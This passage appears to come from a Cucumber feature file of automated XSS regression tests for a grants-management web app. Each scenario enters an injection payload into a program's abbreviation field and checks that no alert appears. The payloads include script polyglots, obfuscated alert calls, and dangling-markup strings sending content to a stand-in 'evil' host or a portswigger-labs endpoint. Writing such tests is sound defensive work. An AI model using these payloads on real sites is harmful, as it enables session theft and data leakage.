    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                 | Field                |
      | <object data="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301610 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                | Field                |
      | <iframe src="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301611 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value               | Field                |
      | <embed src="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301613 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                         | Field                |
      | <form><button formaction=//evil>XSS</button><textarea name=x> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301615 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                        | Field                |
      | <button form=x>XSS</button><form id=x action=//evil target=' | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301616 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                        | Field                |
      | <a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target=" | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301618 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                              | Field                |
      | <form><input type=submit value="Click me" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget=" | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301619 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                 | Field                |
      | <a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;">xss<base href="//evil/ | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301622 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                              | Field                |
      | <embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=" | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301623 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                               | Field                |
      | <iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=" | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301625 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                | Field                |
      | <object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=" | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301626 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                        | Field                |
      | <frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=" | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301627 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                      | Field                |
      | <input type=hidden type=image src="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301628 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                            | Field                |
      | javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301631 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                          | Field                |
      | javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \"  onmouseover=/*&lt;svg/*/onload=alert()//> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301632 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                           | Field                |
      | javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301633 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                       | Field                |
      | ';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301635 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                   | Field                |
      | ';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
